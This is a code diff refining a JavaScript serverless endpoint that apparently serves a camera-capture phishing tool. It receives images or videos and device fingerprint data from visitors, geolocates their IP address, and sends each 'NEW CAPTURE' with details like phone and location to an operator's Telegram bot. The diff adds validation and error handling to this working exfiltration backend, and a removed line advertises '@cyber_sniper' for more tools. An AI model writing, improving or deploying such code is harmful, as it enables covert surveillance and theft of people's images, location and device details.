@@ -1,38 +1,45 @@
+import fs from 'fs';
+import path from 'path';
+
 export default async function handler(req, res) {
-    if (req.method !== 'POST') return res.status(405).end();
+    // 1. Only accept POST
+    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
 
     const { type, image, video, mimeType, fingerprint, videoIndex } = req.body;
     if (!type) return res.status(400).json({ error: 'Missing type' });
+    if (type === 'image' && !image) return res.status(400).json({ error: 'No image' });
+    if (type === 'video' && !video) return res.status(400).json({ error: 'No video' });
 
+    // 2. Get config (env vars first, then files)
     let BOT_TOKEN = process.env.BOT_TOKEN;
     let CHAT_ID = process.env.CHAT_ID;
+
     if (!BOT_TOKEN || !CHAT_ID) {
         try {
-            const fs = require('fs');
-            const path = require('path');
-            BOT_TOKEN = fs.readFileSync(path.join(process.cwd(), 'token.txt'), 'utf8').trim();
-            CHAT_ID = fs.readFileSync(path.join(process.cwd(), 'uid.txt'), 'utf8').trim();
+            const root = process.cwd();
+            BOT_TOKEN = fs.readFileSync(path.join(root, 'token.txt'), 'utf8').trim();
+            CHAT_ID = fs.readFileSync(path.join(root, 'uid.txt'), 'utf8').trim();
         } catch (e) {
-            return res.status(500).json({ error: 'Bot config missing' });
+            return res.status(500).json({ error: 'Bot config missing: ' + e.message });
         }
     }
 
-    // Get client IP
+    // 3. Get client IP
     const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
 
-    // Fetch geolocation from ip-api.com (free, no key)
+    // 4. Fetch geolocation from ip-api.com (free, no key)
     let geo = {};
     try {
         const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,org,as,query`);
         geo = await geoRes.json();
     } catch (e) {
-        geo = { status: 'fail' };
+        geo = { status: 'fail', country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
     }
 
     const f = fingerprint || {};
     const videoLabel = videoIndex !== undefined ? ` (Video ${videoIndex+1})` : '';
 
-    // Build the caption
+    // 5. Build the caption
     const caption = `📡 **NEW CAPTURE** ${type === 'video' ? '🎥' : '📸'}${videoLabel}\n` +
         `━━━━━━━━━━━━━━━━━━\n` +
         `📞 **Phone:** ${f.phone || 'N/A'}\n` +
@@ -54,10 +61,9 @@ export default async function handler(req, res) {
         `🌐 **Online:** ${f.online ? 'Yes' : 'No'}\n` +
         `🚫 **DNT:** ${f.doNotTrack || 'N/A'}\n` +
         `━━━━━━━━━━━━━━━━━━\n` +
-        `**More Tools:** @cyber_sniper\n` +
-        `━━━━━━━━━━━━━━━━━━\n` +
         `🕒 **Captured:** ${new Date().toLocaleString()}`;
 
+    // 6. Build FormData
     let form = new FormData();
     form.append('chat_id', CHAT_ID);
     form.append('caption', caption);
@@ -72,6 +78,7 @@ export default async function handler(req, res) {
         form.append('video', new Blob([buffer], { type: mimeType }), `capture_${videoIndex}.${ext}`);
     }
 
+    // 7. Send to Telegram
     try {
         const endpoint = type === 'image'
             ? `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`
@@ -79,10 +86,15 @@ export default async function handler(req, res) {
 
         const response = await fetch(endpoint, { method: 'POST', body: form });
         const data = await response.json();
-        if (!response.ok) return res.status(500).json({ error: data.description });
+
+        if (!response.ok) {
+            console.error('Telegram error:', data);
+            return res.status(500).json({ error: `Telegram: ${data.description}` });
+        }
+
         res.status(200).json({ status: 'ok' });
     } catch (error) {
-        console.error(error);
+        console.error('Server error:', error);
         res.status(500).json({ error: error.message });
     }
 }
